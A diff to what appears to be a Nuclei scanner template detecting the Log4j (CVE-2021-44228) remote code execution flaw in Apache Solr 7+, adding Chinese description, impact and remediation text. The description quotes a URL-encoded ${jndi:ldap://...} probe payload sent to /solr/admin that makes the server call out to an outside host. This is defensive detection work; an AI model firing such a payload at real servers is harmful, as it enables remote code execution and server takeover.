@@ -4,7 +4,15 @@ info:
   name: Apache Solr 7+ - 远程代码执行漏洞
   author: Evan Rubinstein,nvn1729,j4vaovo
   severity: critical
-  description: Apache Solr 7+ - 远程代码执行 (Apache Log4j) 受 Apache Log4j 相关缺陷影响，攻击者可在满足利用条件时触发远程代码执行漏洞。该模板通过实际请求与特征匹配验证目标是否仍暴露该漏洞面。
+  description: |
+    该模板用于检测 Apache Solr 7+ - 远程代码执行漏洞。此类问题通常源于受影响组件在日志记录过程中解析可控 JNDI 表达式，可能触发外带交互或远程代码执行。模板主要向 `/solr/admin/{变量}?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-{变量}%7D%24%7B%3A-{变量}%7D.%24%7BhostNa...` 等路径发送探测请求，并根据OAST/DNS/HTTP 外带交互、响应状态或关键字回显确认漏洞是否存在。
+  impact: |
+    - 攻击者可能通过 Log4j/JNDI 解析链触发远程类加载或外带交互，在受影响服务进程权限下执行代码。
+    - 成功利用后可能导致服务器被接管、敏感配置和凭据泄露，并成为进一步横向移动的入口。
+  remediation: |
+    - 升级受影响产品和 Log4j 组件到厂商修复版本，移除或替换存在风险的 Log4j 1.x/2.x 依赖。
+    - 在无法立即升级时，禁用 JNDI 远程加载相关能力，并限制服务器对 LDAP/RMI/DNS 等外联通道的访问。
+    - 复核应用日志、异常外联、进程启动和新增文件，确认是否已发生利用并轮换可能暴露的凭据。
   reference:
     - https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228
     - https://twitter.com/sirifu4k1/status/1470011568834424837
